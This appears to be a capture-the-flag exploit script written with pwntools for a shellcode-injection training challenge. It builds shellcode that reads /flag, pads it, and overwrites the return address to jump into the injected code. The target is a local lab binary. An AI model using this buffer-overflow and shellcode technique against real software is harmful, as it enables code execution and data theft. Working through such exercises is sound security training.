from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/shellcode-injection-level3.2"
p = process(challenge_path)

shellcode=asm(shellcraft.cat("/flag"))
payload=shellcode.ljust(256,b'a')+p64(0x1111111111111111)
payload+=p64(0x12340000)
p.sendlineafter("Give me your input\n",payload)
result=p.recvall()
print(result)

# python3 /home/hacker/si3.2.py